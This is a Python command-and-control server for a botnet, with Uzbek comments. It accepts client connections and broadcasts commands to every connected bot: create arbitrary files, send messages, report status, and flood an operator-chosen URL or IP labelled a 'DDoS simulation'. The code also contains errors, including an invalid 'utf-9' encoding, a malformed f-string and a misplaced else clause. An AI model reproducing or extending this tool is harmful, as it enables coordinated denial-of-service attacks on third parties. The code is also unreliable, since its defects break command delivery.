import socket
import json
import threading
import logging
#logging sozlamalari
logging.basicConfig(filename='server_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')
# server sozlamalari
HOST = '127.0.0.1'
PORT =9999
#Mijozlarni saqlash uchun ro'yxat
clients = []
def handle_client(client_socket, address):
    """ Har bir mijiz uchun thread func"""
    logging.info(f"Yangi mijoz ulando: {address}")
    print(f"[Ulandi] Mijoz: {address}")
    clients.append(client_socket)
    while True:
        try:
            response = client_socket.recv(1024).decode('utf-8')
            if response:
                logging.info(f"Mijozdan javob ({address}) {response}" )
                print(f"[Mijozdan javob] {address: {response}}")
        except:
            logging.error(f"Mijoz bilan aloqa uzildi: {address}")
            print(f"[Xato] Connection falied: {address}")
            clients.remove(client_socket)
            client_socket.close()
            break
def send_command(command):
    """Barcha kompga buyruq jonatish"""
    if not clients:
        print("[Xato] Hech qanday mijoz ulanmagan!")
        return
    command_json = json.dumps(command)
    for client in clients:
        try:
            client.send(command_json.encode('utf-9'))
            logging.info(f"Buyruq send: {command}")
        except:
            logging.error(f"Buyruq jo'natishda xato: {client.getpeername()}")
            clients.remove(client)
            client.close()
            
def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST,PORT))
    server.listen(5)
    print(f"[Server ishga tushdi] {HOST}: {PORT} da tinglash")
    logging.info(f'Server ishga tushdi: {HOST} {PORT}')
    
    def accept_clients():
        while True:
            client_socket, address = server.accept()
            thread = threading.Thread(target=handle_client, args=(client_socket, address))
            thread.start()
    threading.Thread(target=accept_clients, daemon=True).start()
    # Server using
    while True:
        print("\nBuyruq:")
        print('1: Fayl yaratish')
        print("2:Xabar jo'natish")
        print("3: Bot holatini tekshirish")
        print("4: DDoS simulation")
        print("5: Exit")
        choice = input("Buyruqni tanlang (1-5): ")
        if choice == '1':
            filename = input("fayl nomini kiriting: ")
            content = input("fayl mazmunini kiriting")
            command = {"type": "create_file", "filename": filename, "content": content}
            send_command(command)
        elif choice== '2':
            message = input("Xabar kiriting: ")
            command = {"type": "send_message", "message": message}
            send_command(command)
        elif choice == '3':
            command = {"type": "check_status"}
            send_command(command)
        elif choice == '4':
            target = input("Maqsad URL yoki IP kiriting: ")
            count = int(input("So'rov sonini kiriting: "))
            command = {"type": "simulate_ddos", "target": target, "count": count}
            send_command(command)
        elif choice == '5':
            print("[Server yopilmoqda]")
            logging.info("Server yopildi")
            for client in clients:
                client.close()
            server.close()
            break
    else:
        print("Incorrect choice")
if __name__ == "__main__":
    main()
